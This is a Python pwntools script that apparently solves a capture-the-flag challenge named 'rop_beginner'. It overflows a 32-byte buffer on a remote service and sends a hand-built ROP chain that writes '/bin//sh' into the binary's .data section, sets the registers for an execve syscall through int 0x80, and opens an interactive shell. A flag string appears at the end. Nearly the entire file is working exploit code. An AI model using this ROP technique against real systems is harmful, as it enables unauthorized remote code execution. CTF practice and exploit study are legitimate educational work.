#!/usr/bin/env python
from pwn import *

r = remote('192.168.31.25',11003)
rop_beg = ELF('./rop_beginner')

#gdb-peda$ checksec
#CANARY    : disabled
#FORTIFY   : disabled
#NX        : ENABLED
#PIE       : disabled
#RELRO     : Partial

padding = 'A'*32


# system call-----------------
# eax = 11
# ebx = address of '/bin//sh'
# ecx = 0
# edx = 0

rop = ''

# edx = address of section data
rop += p32(0x0806e82a) # pop edx ; ret
rop += p32(0x080ea060) # @ .data

# data section 0x0 = '/bin'
rop += p32(0x080bae06) # pop eax ; ret
rop += '/bin'
rop += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

# data section 0x4 = '//sh'
rop += p32(0x0806e82a) # pop edx ; ret
rop += p32(0x080ea064) # @ .data + 4
rop += p32(0x080bae06) # pop eax ; ret
rop += '//sh'
rop += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

# data section 0x8 = 0
rop += p32(0x0806e82a) # pop edx ; ret
rop += p32(0x080ea068) # @ .data + 8
rop += p32(0x08054250) # xor eax, eax ; ret
rop += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

# ebx = address of 'bin//sh' = section data 0x0
rop += p32(0x080481c9) # pop ebx ; ret
rop += p32(0x080ea060) # @ .data

# ecx = 0 
rop += p32(0x0806e851) # pop ecx ; pop ebx ; ret
rop += p32(0x080ea068) # @ .data + 8
rop += p32(0x080ea060) # padding without overwrite ebx

# edx = 0
rop += p32(0x0806e82a) # pop edx ; ret
rop += p32(0x080ea068) # @ .data + 8

# eax = 11
rop += p32(0x08054250) # xor eax, eax ; ret
rop += p32(0x080be38a) # add al, 8 ; ret
rop += p32(0x0807b27f) # inc eax ; ret
rop += p32(0x0807b27f) # inc eax ; ret
rop += p32(0x0807b27f) # inc eax ; ret

rop += p32(0x080493e1) # int 0x80


payload = padding + rop

r.readuntil(':')
r.send(payload)
r.interactive()

#AD{R0proPRooooop}
